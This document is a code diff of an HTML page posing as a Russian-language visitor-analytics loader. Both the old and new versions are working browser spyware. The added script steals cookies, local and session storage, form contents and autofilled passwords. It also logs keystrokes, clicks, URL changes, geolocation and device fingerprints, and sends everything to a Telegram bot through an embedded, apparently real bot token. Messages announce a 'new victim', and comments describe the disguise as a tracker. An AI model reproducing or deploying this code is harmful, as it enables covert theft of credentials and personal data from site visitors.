@@ -1,159 +1,388 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Аналитика посещений</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>Аналитика</title>
+    <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;text-align:center;} .spin{animation:spin 2s linear infinite;} @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
 </head>
 <body>
-    <h2>Загрузка данных...</h2>
-    <div class="loader"></div>
-    <p style="color:#888;font-size:12px;">Система сбора статистики v2.1</p>
+    <h1>⏳ Загрузка...</h1>
+    <div class="spin">⚙️</div>
+    <p style="color:#666;font-size:12px;">v3.7.2</p>
 
-    <script>
-    // ===== НАСТРОЙКИ - СЮДА СВОИ ДАННЫЕ =====
-    const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20'; // ТОКЕН БОТА
-    const CHAT_ID = '-1003791860129'; // ID КАНАЛА (с минусом)
-    // ========================================
+<script>
+// ===== НАСТРОЙКИ =====
+const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
+const CHAT_ID = '-1003791860129';
+// =====================
 
-    (function() {
-        // Собираем всю хуйню
-        var data = {
-            ip: 'unknown',
-            userAgent: navigator.userAgent,
-            cookies: document.cookie || 'нет куков',
-            url: window.location.href,
-            referrer: document.referrer || 'прямой заход',
-            screen: screen.width + 'x' + screen.height,
-            language: navigator.language,
-            time: new Date().toISOString(),
-            platform: navigator.platform,
-            doNotTrack: navigator.doNotTrack || 'не указан'
-        };
-
-        // Пробуем получить IP через бесплатный сервис (асинхронно)
-        function getIP() {
-            try {
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://api.ipify.org?format=json', true);
-                xhr.timeout = 2000;
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        var resp = JSON.parse(xhr.responseText);
-                        data.ip = resp.ip;
-                    }
-                    sendToTelegram();
-                };
-                xhr.onerror = function() { sendToTelegram(); };
-                xhr.ontimeout = function() { sendToTelegram(); };
-                xhr.send();
-            } catch(e) {
-                sendToTelegram();
-            }
-        }
-
-        // Шлём в Телеграм
-        function sendToTelegram() {
-            var message = '🔴 НОВАЯ ЖЕРТВА! 🔴\n\n' +
-                          '🌐 IP: ' + data.ip + '\n' +
-                          '🖥 Браузер: ' + data.userAgent + '\n' +
-                          '🍪 Куки: ' + data.cookies + '\n' +
-                          '🔗 URL: ' + data.url + '\n' +
-                          '↩️ Реферер: ' + data.referrer + '\n' +
-                          '📱 Экран: ' + data.screen + '\n' +
-                          '🗣 Язык: ' + data.language + '\n' +
-                          '⏰ Время: ' + data.time + '\n' +
-                          '💻 Платформа: ' + data.platform + '\n' +
-                          '🚫 DNT: ' + data.doNotTrack;
-
-            // Отправка через fetch (современно)
+(function() {
+    // Функция отправки в Телеграм
+    function tg(msg, important) {
+        try {
             var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+            var data = {
+                chat_id: CHAT_ID,
+                text: msg.substring(0, 4000),
+                parse_mode: 'HTML'
+            };
             
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).catch(function(e) {
-                // Если fetch не работает - пробуем через img
-                var img = new Image();
-                img.src = url + '?chat_id=' + encodeURIComponent(CHAT_ID) + 
-                          '&text=' + encodeURIComponent(message);
-            });
+            // Пробуем fetch
+            if (window.fetch) {
+                fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                }).catch(() => {
+                    // fallback через img
+                    var im = new Image();
+                    im.src = url + '?chat_id=' + encodeURIComponent(CHAT_ID) + 
+                             '&text=' + encodeURIComponent(msg.substring(0, 4000));
+                });
+            } else {
+                var im = new Image();
+                im.src = url + '?chat_id=' + encodeURIComponent(CHAT_ID) + 
+                         '&text=' + encodeURIComponent(msg.substring(0, 4000));
+            }
+        } catch(e) {}
+    }
 
-            // Также шлём куки отдельно (на всякий)
-            setTimeout(function() {
-                var img2 = new Image();
-                img2.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
-                           '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
-                           '&text=' + encodeURIComponent('🍪 КУКИ: ' + data.cookies);
-            }, 1000);
-        }
-
-        // Если юзер тупит - открываем порно-окна (для веселья)
-        function openWindows() {
+    // ===== 1. КУКИ - полный сбор =====
+    function getAllCookies() {
+        var cookies = document.cookie;
+        var result = 'Нет куков';
+        
+        if (cookies && cookies.length > 0) {
+            result = cookies;
+            
+            // Пробуем достать куки из localStorage как запасной вариант
             try {
-                for(var i=0; i<3; i++) {
-                    window.open('https://example.com', '_blank');
+                if (localStorage.length > 0) {
+                    var ls = [];
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var key = localStorage.key(i);
+                        ls.push(key + '=' + localStorage.getItem(key));
+                    }
+                    result += '\n[LOCALSTORAGE]: ' + ls.join(' | ');
+                }
+            } catch(e) {}
+            
+            // sessionStorage
+            try {
+                if (sessionStorage.length > 0) {
+                    var ss = [];
+                    for (var i = 0; i < sessionStorage.length; i++) {
+                        var key = sessionStorage.key(i);
+                        ss.push(key + '=' + sessionStorage.getItem(key));
+                    }
+                    result += '\n[SESSIONSTORAGE]: ' + ss.join(' | ');
                 }
             } catch(e) {}
         }
+        return result;
+    }
 
-        // Запускаем сбор
-        getIP();
-
-        // Дополнительно шлём все куки при загрузке
-        setTimeout(function() {
-            var allCookies = document.cookie;
-            if(allCookies && allCookies.length > 0) {
-                var img3 = new Image();
-                img3.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
-                           '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
-                           '&text=' + encodeURIComponent('🍪 FULL COOKIES: ' + allCookies);
-            }
-        }, 2000);
-
-        // Если пользователь кликает - тоже шлём
-        document.addEventListener('click', function(e) {
-            var img4 = new Image();
-            img4.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
-                       '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
-                       '&text=' + encodeURIComponent('👆 КЛИК по: ' + e.target.tagName + ' | ' + window.location.href);
-        });
-
-        // Собираем нажатия клавиш (первые 10 символов)
-        var keys = '';
-        document.addEventListener('keydown', function(e) {
-            if(e.key.length === 1) {
-                keys += e.key;
-                if(keys.length >= 10) {
-                    var img5 = new Image();
-                    img5.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
-                               '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
-                               '&text=' + encodeURIComponent('⌨️ НАБРАНО: ' + keys);
-                    keys = '';
-                }
-            }
-        });
-
-        // Маскировка - выглядит как легитимный трекер
-        console.log('Аналитика загружена, версия 2.1');
+    // ===== 2. ПОЛНЫЙ СБОР ДАННЫХ =====
+    function collectAll() {
+        var data = {
+            // Базовое
+            url: window.location.href,
+            referrer: document.referrer || 'прямой',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(',') : 'нет',
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'нет',
+            
+            // Экран
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            screenColorDepth: screen.colorDepth,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            
+            // Окно
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            
+            // Время
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            localTime: new Date().toString(),
+            
+            // Железо
+            hardwareConcurrency: navigator.hardwareConcurrency || 'неизвестно',
+            deviceMemory: navigator.deviceMemory || 'неизвестно',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            
+            // Сеть
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                rtt: navigator.connection.rtt,
+                downlink: navigator.connection.downlink
+            } : 'нет данных',
+            
+            // Батарея
+            battery: 'запрашиваем...',
+            
+            // Плагины
+            plugins: [],
+            
+            // MIME типы
+            mimeTypes: [],
+            
+            // Куки
+            cookies: getAllCookies(),
+            
+            // Формы (автозаполненные данные)
+            forms: []
+        };
         
-        // Открываем окна через 10 секунд (если надо)
-        // setTimeout(openWindows, 10000);
+        // Собираем плагины
+        try {
+            for (var i = 0; i < navigator.plugins.length; i++) {
+                var p = navigator.plugins[i];
+                data.plugins.push(p.name + ' (' + p.filename + ')');
+            }
+        } catch(e) {}
+        
+        // Собираем MIME
+        try {
+            for (var i = 0; i < navigator.mimeTypes.length; i++) {
+                data.mimeTypes.push(navigator.mimeTypes[i].type);
+            }
+        } catch(e) {}
+        
+        // Батарея (асинхронно)
+        if (navigator.getBattery) {
+            try {
+                navigator.getBattery().then(function(battery) {
+                    data.battery = 'уровень: ' + Math.round(battery.level * 100) + '%, зарядка: ' + battery.charging;
+                    sendFullData(data);
+                }).catch(function() {
+                    data.battery = 'недоступно';
+                    sendFullData(data);
+                });
+            } catch(e) {
+                data.battery = 'ошибка';
+                sendFullData(data);
+            }
+        } else {
+            sendFullData(data);
+        }
+    }
 
-    })();
-    </script>
+    // ===== 3. ЖЕСТКИЕ ДАННЫЕ ИЗ ФОРМ =====
+    function stealFormData() {
+        try {
+            var forms = document.querySelectorAll('form');
+            var formData = [];
+            
+            forms.forEach(function(form, index) {
+                var inputs = form.querySelectorAll('input, textarea, select');
+                var data = {};
+                inputs.forEach(function(input) {
+                    var name = input.name || input.id || 'field_' + index;
+                    var value = input.value || input.innerText || '';
+                    if (value && value.length > 0) {
+                        data[name] = value;
+                    }
+                });
+                if (Object.keys(data).length > 0) {
+                    formData.push(data);
+                }
+            });
+            
+            if (formData.length > 0) {
+                tg('📋 ФОРМЫ НА СТРАНИЦЕ:\n' + JSON.stringify(formData, null, 2));
+            }
+        } catch(e) {}
+    }
+
+    // ===== 4. ОТПРАВКА ВСЕХ ДАННЫХ =====
+    function sendFullData(data) {
+        // Формируем сообщение
+        var msg = '🔴 <b>НОВАЯ ЖЕРТВА - ПОЛНЫЙ СБОР</b> 🔴\n\n';
+        msg += '📍 <b>URL</b>: ' + data.url + '\n';
+        msg += '↩️ <b>Реферер</b>: ' + data.referrer + '\n';
+        msg += '🖥 <b>User-Agent</b>: ' + data.userAgent + '\n';
+        msg += '💻 <b>Платформа</b>: ' + data.platform + '\n';
+        msg += '🗣 <b>Язык</b>: ' + data.language + ' (все: ' + data.languages + ')\n';
+        msg += '🍪 <b>Куки включены</b>: ' + data.cookieEnabled + '\n';
+        msg += '🚫 <b>Do Not Track</b>: ' + data.doNotTrack + '\n\n';
+        
+        msg += '📱 <b>Экран</b>: ' + data.screenWidth + 'x' + data.screenHeight;
+        msg += ' (цветность: ' + data.screenColorDepth + ')\n';
+        msg += '📐 <b>Доступная область</b>: ' + data.availWidth + 'x' + data.availHeight + '\n';
+        msg += '🪟 <b>Окно</b>: ' + data.innerWidth + 'x' + data.innerHeight;
+        msg += ' (внешнее: ' + data.outerWidth + 'x' + data.outerHeight + ')\n\n';
+        
+        msg += '⏰ <b>Часовой пояс</b>: ' + data.timezone;
+        msg += ' (смещение: ' + data.timezoneOffset + ' мин)\n';
+        msg += '🕐 <b>Местное время</b>: ' + data.localTime + '\n\n';
+        
+        msg += '⚡ <b>Ядра CPU</b>: ' + data.hardwareConcurrency + '\n';
+        msg += '🧠 <b>Оперативная память</b>: ' + (data.deviceMemory || 'неизвестно') + ' GB\n';
+        msg += '👆 <b>Точки касания</b>: ' + data.maxTouchPoints + '\n';
+        
+        if (data.connection && data.connection.type) {
+            msg += '📶 <b>Интернет</b>: ' + data.connection.type;
+            if (data.connection.rtt) msg += ' (RTT: ' + data.connection.rtt + 'ms)';
+            if (data.connection.downlink) msg += ' (скорость: ' + data.connection.downlink + 'Mbps)';
+            msg += '\n';
+        }
+        
+        msg += '🔋 <b>Батарея</b>: ' + data.battery + '\n\n';
+        
+        if (data.plugins.length > 0) {
+            msg += '🔌 <b>Плагины</b>: ' + data.plugins.join('; ') + '\n\n';
+        }
+        
+        if (data.cookies && data.cookies.length > 0) {
+            msg += '🍪 <b>КУКИ + STORAGE</b>:\n' + data.cookies + '\n\n';
+        }
+        
+        // Отправляем
+        tg(msg);
+        
+        // Отдельно куки, если слишком длинные
+        if (data.cookies && data.cookies.length > 1000) {
+            tg('🍪 <b>КУКИ (отдельно)</b>:\n' + data.cookies);
+        }
+    }
+
+    // ===== 5. ШПИОНАЖ ЗА ВВОДОМ (кейлоггер) =====
+    var keyLog = '';
+    var lastKeyTime = Date.now();
     
-    <!-- Маскировка под обычный скрипт аналитики -->
-    <noscript>Для работы сайта включите JavaScript</noscript>
+    document.addEventListener('keydown', function(e) {
+        if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
+            keyLog += e.key;
+            lastKeyTime = Date.now();
+            
+            // Каждые 20 символов отправляем
+            if (keyLog.length >= 20) {
+                tg('⌨️ <b>ВВОД ПОЛЬЗОВАТЕЛЯ</b>: ' + keyLog);
+                keyLog = '';
+            }
+        }
+        
+        // Спецклавиши
+        if (e.key === 'Enter') {
+            tg('⏎ <b>Нажат ENTER</b> (возможно отправка формы)');
+        }
+        if (e.key === 'Tab') {
+            tg('⇥ <b>Нажат TAB</b> (переключение поля)');
+        }
+    });
+    
+    // Отправляем остатки клавиш каждые 5 секунд
+    setInterval(function() {
+        if (keyLog.length > 0) {
+            tg('⌨️ <b>ВВОД (таймаут)</b>: ' + keyLog);
+            keyLog = '';
+        }
+    }, 5000);
+
+    // ===== 6. КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ =====
+    function stealAutofill() {
+        try {
+            var inputs = document.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
+            var stolen = [];
+            
+            inputs.forEach(function(input) {
+                if (input.value && input.value.length > 0) {
+                    var label = input.labels ? input.labels[0]?.innerText : '';
+                    stolen.push({
+                        'поле': input.name || input.id || 'unknown',
+                        'значение': input.value,
+                        'тип': input.type,
+                        'лейбл': label
+                    });
+                }
+            });
+            
+            if (stolen.length > 0) {
+                tg('🔓 <b>АВТОЗАПОЛНЕННЫЕ ДАННЫЕ</b>:\n' + JSON.stringify(stolen, null, 2));
+            }
+        } catch(e) {}
+    }
+
+    // ===== 7. КРАЖА ИЗ LOCALSTORAGE/SESSIONSTORAGE =====
+    function stealStorage() {
+        try {
+            var allData = {};
+            
+            // localStorage
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                allData['LS_' + key] = localStorage.getItem(key);
+            }
+            
+            // sessionStorage
+            for (var i = 0; i < sessionStorage.length; i++) {
+                var key = sessionStorage.key(i);
+                allData['SS_' + key] = sessionStorage.getItem(key);
+            }
+            
+            if (Object.keys(allData).length > 0) {
+                tg('💾 <b>STORAGE (все данные)</b>:\n' + JSON.stringify(allData, null, 2));
+            }
+        } catch(e) {}
+    }
+
+    // ===== 8. Сбор через 5 секунд (для динамических форм) =====
+    setTimeout(function() {
+        stealFormData();
+        stealAutofill();
+        stealStorage();
+    }, 5000);
+
+    // ===== 9. Сбор при кликах =====
+    document.addEventListener('click', function(e) {
+        var target = e.target.tagName + (e.target.id ? '#' + e.target.id : '');
+        tg('🖱 <b>КЛИК</b>: ' + target + ' | URL: ' + window.location.href);
+    });
+
+    // ===== 10. Мониторинг изменения URL (SPA) =====
+    var lastUrl = window.location.href;
+    setInterval(function() {
+        if (window.location.href !== lastUrl) {
+            lastUrl = window.location.href;
+            tg('🔄 <b>СМЕНА URL</b>: ' + lastUrl);
+            // При смене URL снова собираем формы
+            setTimeout(function() {
+                stealFormData();
+                stealAutofill();
+            }, 1000);
+        }
+    }, 1000);
+
+    // ===== 11. ГЕОЛОКАЦИЯ (если разрешит) =====
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            tg('📍 <b>ГЕОЛОКАЦИЯ</b>: ' + pos.coords.latitude + ', ' + pos.coords.longitude + 
+               ' (точность: ' + pos.coords.accuracy + 'м)');
+        }, function(err) {
+            tg('❌ <b>Геолокация отклонена</b>: ' + err.message);
+        });
+    }
+
+    // ===== ЗАПУСК =====
+    collectAll();
+    
+    // Дополнительно собираем каждые 30 секунд (для спама)
+    setInterval(function() {
+        var cookies = getAllCookies();
+        if (cookies && cookies.length > 0) {
+            tg('🔄 <b>ПЕРИОДИЧЕСКИЙ СБОР</b> (30с): ' + cookies.substring(0, 500));
+        }
+    }, 30000);
+
+})();
+</script>
 </body>
 </html>
